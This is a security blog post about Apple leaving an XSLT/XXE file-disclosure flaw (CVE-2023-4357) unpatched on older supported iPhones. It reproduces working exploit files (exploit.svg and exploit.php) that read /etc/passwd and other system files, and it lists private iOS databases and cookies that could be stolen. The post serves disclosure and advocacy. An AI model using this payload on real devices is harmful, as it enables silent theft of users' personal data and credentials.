---
layout: post
title: "No new iPhone? No secure iOS: Looking at an unfixed iOS vulnerability"
author: "Joshua Rogers"
categories: security
---

What's the deal with iOS security updates, anyway?

Not everybody can afford the newest and greatest Apple product. Luckily, Apple continues to support nearly-decade-old devices like the iPhone 6S, with iOS 15.8 still powering those devices with official Apple support, with the latest update from [October the 25th, which addressed some security vulnerabilities](https://support.apple.com/en-gb/109032).

In reality, however, Apple seems to only be addressing _some_ security issues in its older supported devices.

---

On June the 28th, Chromium announced that it had patched a vulnerability titled ["CVE-2023-4357: Insufficient validation of untrusted input in XML"](https://chromereleases.googleblog.com/2023/08/stable-channel-update-for-desktop_15.html). In the [bug report](https://bugs.chromium.org/p/chromium/issues/detail?id=1458911) for that issue, it was shown that on various devices, Google Chrome's Blink rendering engine could reveal the contents of arbitrary files: `/etc/passwd`, for example. Interestingly, this also included Chrome for iOS. Given that Apple forces all browsers in iOS to use the WebKit rendering engine, that meant this vulnerability not only affected Blink, but also WebKit.

---

Taking that exploit from June:

`exploit.svg`:
```html
<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet type="text/xsl" href="?#"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">

<xsl:template match="/">

<svg width="1000%" height="1000%" version="1.1" xmlns="http://www.w3.org/2000/svg">
<foreignObject class="node" font-size="18" width="100%" height="100%">
<body xmlns="http://www.w3.org/1999/xhtml">
<xmp><xsl:copy-of select="document('exploit.php')"/></xmp>
</body>
</foreignObject>
</svg>

</xsl:template>
</xsl:stylesheet>
```

`exploit.php`:
```php
<?php header("Access-Control-Allow-Origin: *");?>
<!DOCTYPE p [
<!ENTITY passwd SYSTEM "file:///etc/passwd">
<!ENTITY hosts SYSTEM "file:///etc/hosts">
<!ENTITY group SYSTEM "file://localhost/etc/group">
]>
<p>

<p style="border-style: dotted;">/etc/passwd:
&passwd;
</p>
<p style="border-style: dotted;">/etc/hosts:

&hosts;
</p>
<p style="border-style: dotted;">/etc/group:

&group;
</p>

</p>
```


and trying it on the latest version of iOS that the (supported) iPhone 6S, we indeed see that the exploit _still_ works. When opening the page, your `/etc/passwd` is there for the world to see.

That means that any website visited by anybody using an iPhone 6S (or possibly later versions) can silently steal internal system files. What files could somebody steal? Well, there's always:

* AddressBook.sqlitedb: which contains all of the personal contact information of the user and any saved contacts.
* call_history.db: which contains all received, dialled, and missed calls of the user.
* SMS/call_history.db: which contains the SMS history of the user.

Or maybe:
* History.plist: which contains the browsing history of the user.
* Cookies.plist: which contains the browser's cookies -- including authentication cookies, which an attacker can re-use once they are stolen.


---

After contacting Apple to see whether they intended to patch this, the response was quite short: `If in the future you are able to reproduce this issue using a different device that's running iOS 17 or later, please let us know.`

This raises some interesting questions. First off, does it imply that Apple does not patch vulnerabilities in older versions of iOS unless they may used to root/jailbreak the iPhone, or are known to be actively being either mass-exploited or exploited by some nation-state?

A [new exploit targeting the iOS](https://github.com/skysafe/reblog/tree/main/cve-2023-45866) (among other OS') Bluetooth stack has also been [left unpatched by Apple in all versions except iOS 17](https://support.apple.com/en-us/HT214035).

If I was an exploit vendor, I would be paying very close attention to vulnerabilities fixed in iOS 17, and seeing whether they work on previous (supported) iOS versions. Not every target has the newest Apple device, and minimal amount of surveillance may save the vendor from burning a 0day on a target that is using a slightly older device.

---


Note: I haven't tested this against older (supported) MacOS versions, but it's definitely possible that Safari is exploitable here, too.
